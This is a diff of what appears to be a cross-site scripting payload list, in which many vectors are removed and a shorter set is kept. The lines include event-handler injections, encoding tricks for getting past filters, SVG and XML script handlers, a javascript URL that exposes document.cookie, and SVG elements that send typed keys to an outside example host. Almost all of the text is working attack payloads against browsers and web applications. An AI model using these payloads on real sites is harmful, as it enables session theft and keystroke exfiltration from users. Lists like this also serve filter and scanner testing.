@@ -1,198 +1,35 @@
-<x contenteditable onblur=alert(1)>lose focus!
-<x onclick=alert(1)>click this!
-<x oncopy=alert(1)>copy this!
-<x oncontextmenu=alert(1)>right click this!
-<x oncut=alert(1)>copy this!
-<x ondblclick=alert(1)>double click this!
-<x ondrag=alert(1)>drag this!
-<x contenteditable onfocus=alert(1)>focus this!
-<x contenteditable oninput=alert(1)>input here!
-<x contenteditable onkeydown=alert(1)>press any key!
-<x contenteditable onkeypress=alert(1)>press any key!
-<x contenteditable onkeyup=alert(1)>press any key!
-<x onmousedown=alert(1)>click this!
-<x onmousemove=alert(1)>hover this!
-<x onmouseout=alert(1)>hover this!
-<x onmouseover=alert(1)>hover this!
-<x onmouseup=alert(1)>click this!
-<x contenteditable onpaste=alert(1)>paste here!
-<x onxxx=alert(1) 1='
-<xss id=x tabindex=1 onactivate=alert(1)></xss>
-<xss id=x tabindex=1 onbeforeactivate=alert(1)></xss>
-<xss id=x tabindex=1 onbeforedeactivate=alert(1)></xss><input autofocus>
-<xss id=x tabindex=1 onblur=alert(1)></xss><input autofocus>
-<xss id=x tabindex=1 ondeactivate=alert(1)></xss><input autofocus>
-<xss id=x tabindex=1 onfocus=alert(1)></xss>
-<xss id=x tabindex=1 onfocusin=alert(1)></xss>
-<xss id=x tabindex=1 onfocusout=alert(1)></xss><input autofocus>
-<html ontouchstart=alert(1)>
-<html ontouchend=alert(1)>
-<html ontouchmove=alert(1)>
-<html ontouchcancel=alert(1)>
-<body onorientationchange=alert(1)>
-<body onhelp=alert(1)>press F1! (MSIE)
 <audio src onloadstart=alert(1)>
 <video onloadstart=alert(1)><source>
-alert`1`
-alert&lpar;1&rpar;
-alert&#x28;1&#x29
-alert&#40;1&#41
-(alert)(1)
-a=alert,a(1)
-[1].find(alert)
-top["al"+"ert"](1)
-top[/al/.source+/ert/.source](1)
-al\u0065rt(1)
-top['al\145rt'](1)
-top['al\x65rt'](1)
-top[8680439..toString(30)](1)
-navigator.vibrate(500)
-eval(URL.slice(-8))>#alert(1)
-eval(location.hash.slice(1)>#alert(1)
-' onmouseover=alert(/XSS/)
 "><iframe%20src="http://google.com"%%203E
 <embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> ?
 <iframe/src \/\/onload = prompt(1)
 <iframe/onreadystatechange=alert(1)
 <svg/onload=alert(1)
-<math><a xlink:href="//jsfiddle.net/t846h/">click
-<img src ?itworksonchrome?\/onerror = alert(1)???
-<math><a xlink:href="//jsfiddle.net/t846h/">click
-'';!--"<XSS>=&{()}
-SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
-<IMG SRC="javascript:alert('XSS')"
-\";alert('XSS');//
-<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
-<IMG SRC="mocha:[code]">
-exp/*<XSS STYLE='no\xss:noxss("*//*");
 getURL("javascript:alert('XSS')")
-a="get";
-<HTML><BODY>
-<? echo('<SCR)';
 <svg%0Aonload=%09((pro\u006dpt))()//
-<w="/x="y>"/OndbLcLick=`<`[confir\u006d``]>z
-<svG/x=">"/oNloaD=confirm()//
-<sCriPt/src=//14.rs?
 <D3/OnMouSEenTer=[2].find(confirm)>z
 <D3"<"/OncLick="1>[confirm``]"<">z
 <D3/OnpOinTeReENter=confirm``>click here
 <Z oncut=alert()>x
 <iFrAMe/src \/\/onload = prompt(1)
-<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
->>> vectors()
-<div id="39"><!-- up to Opera 11.52, FF 3.6.28 -->
-<!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->
 <div id="41"><li style=list-style:url() onerror=alert(41)></li>
-<div id="43"><?xml version="1.0" standalone="no"?>
-<html xmlns="http://www.w3.org/1999/xhtml">
-<body>Hello</body>
-</html>//["'`-->]]>]</div>
 <label dataformatas="html" datasrc="#xss" datafld="payload"></label>//["'`-->]]>]</div>
 <div id="61"><div  style="\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;">XXX</div>//["'`-->]]>]</div>
-<div id="62"><!-- IE 6-8 -->
-<!-- IE 6-9 -->
-<div id="66"><?xml version="1.0"?>
-<root/>//["'`-->]]>]</div>
 <div id="67"><!DOCTYPE x [   <!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx:x"onerror CDATA "alert(67)"onload CDATA "alert(2)">]><img />//["'`-->]]>]</div>
 <div id="83"><x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(83)"><x:timer value="1"/></x:template>//["'`-->]]>]</div>
-<div id="87"><svg xmlns="http://www.w3.org/2000/svg">
-</svg>//["'`-->]]>]</div>
-<div id="88"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-</svg>//["'`-->]]>]</div>
-<div id="89"><svg xmlns="http://www.w3.org/2000/svg">
 <set attributeName="onmouseover" to="alert(89)"/>
 <animate attributeName="onunload" to="alert(89)"/>
-</svg>//["'`-->]]>]</div>
-<div id="90"><!-- Up to Opera 10.63 -->
-<div style=content:url(test2.svg)></div>
-<!-- Up to Opera 11.64 - see link below -->
-<!-- Up to Opera 12.x -->
-<div style="background:url(test5.svg)">PRESS ENTER</div>//["'`-->]]>]</div>
-<div id="91">[A]
-<div id="94"><svg xmlns="http://www.w3.org/2000/svg">
 <handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(94)</handler>
-</svg>//["'`-->]]>]</div>
 <div id="95"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
 <feImage><set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/></feImage>
-</svg>//["'`-->]]>]</div>
-<div id="97"><!-- IE 5-9 -->
-<!-- IE 10 in IE5-9 Standards mode -->
-<div id="98"><div id=d><div style="font-family:'sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B'">X</div></div>
-*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */
-<!--
---><!--*{color:red}   /* all UA */
-*{background:url(xx:x //**/\red/*)} /* IE 6-7 Standards mode */
-</style>//["'`-->]]>]</div>
-<div id="104"><svg xmlns="http://www.w3.org/2000/svg" id="foo">
-<x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/>
-</svg>//["'`-->]]>]</div>
-<div id="108"><!-- IE 5-8 standards mode -->
-<!-- IE 5-9 standards mode -->
-<div id="109"><svg xmlns="http://www.w3.org/2000/svg">
-<a id="x"><rect fill="white" width="1000" height="1000"/></a>
-<rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/>
-</svg>//["'`-->]]>]</div>
-<div id="110"><svg xmlns="http://www.w3.org/2000/svg">
-<path d="M0,0" style="marker-start:url(test4.svg#a)"/>
-</svg>//["'`-->]]>]</div>
-<div id="111"><div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div><div id="112"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div>
-<div id="113"><div id="x">XXX</div>
-<div id="114"><x style="background:url('x[a];color:red;/*')">XXX</x>//["'`-->]]>]</div>
-<div id="116"><div id="x">x</div>
-<import namespace="t" implementation="#default#time2">
-<t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=alert(116)&gt;">//["'`-->]]>]</div>
-<div id="117"><a href="http://attacker.org">
-</a>//["'`-->]]>]</div>
-<textarea type="text" cols="50" rows="10"></textarea>//["'`-->]]>]</div>
-<div id="121"><html xmlns="http://www.w3.org/1999/xhtml"
-xmlns:svg="http://www.w3.org/2000/svg">
-<body style="background:gray">
-<svg:svg><svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox"><svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/><svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/></svg:mask></svg:svg></body>
-</html>//["'`-->]]>]</div>
 <div id="123"><span class=foo>Some text</span>
-<a class=bar href="http://www.example.org">www.example.org</a>
-<div id="125"><?xml version="1.0"?>
-<?xml-stylesheet type="text/xml" href="#stylesheet"?>
-<!DOCTYPE doc [
-<!ATTLIST xsl:stylesheet id    ID    #REQUIRED>]>
 <svg xmlns="http://www.w3.org/2000/svg">
 <div id="127"><svg xmlns="http://www.w3.org/2000/svg" id="x">
 <listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/>
 <handler id="y">alert(127)</handler>
-</svg>//["'`-->]]>]</div>
-<div id="129"><svg>
-</svg>//["'`-->]]>]</div>
-<math>
-</math>//["'`-->]]>]</div>
-<div id="131"><b>drag and drop one of the following strings to the drop box:</b>
-feed:javascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>
-<div id="132"><!doctype html>
-<form>
-<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>
-<br>
-</form>
-<!-- injection --><svg height="50px">
-<image xmlns:xlink="http://www.w3.org/1999/xlink">
 <set attributeName="xlink:href" begin="accessKey(a)" to="//example.com/?a" />
 <set attributeName="xlink:href" begin="accessKey(b)" to="//example.com/?b" />
 <set attributeName="xlink:href" begin="accessKey(c)" to="//example.com/?c" />
 <set attributeName="xlink:href" begin="accessKey(d)" to="//example.com/?d" />
-</image>
-</svg>//["'`-->]]>]</div>
-<div id="134"><xmp>
-<%
-</xmp>
-<img alt='%></xmp><img src=xx:x onerror=aler
-*{color:red}</style>//["'`-->]]>]</div>
-<div id="135"><?xml-stylesheet type="text/xsl" href="#" ?>
-<template match="/">
-<eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(135)</eval>
 <if expr="new ActiveXObject('htmlfile').parentWindow.alert(2)"></if>
-</template>
-</stylesheet>//["'`-->]]>]</div>
 <div id="136"><form action="" method="post">
-</form>//["'`-->]]>]</div>
-<div id="137"><svg>
-<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">
-<circle r="400"></circle>
-</a>//["'`-->]]>]</div>
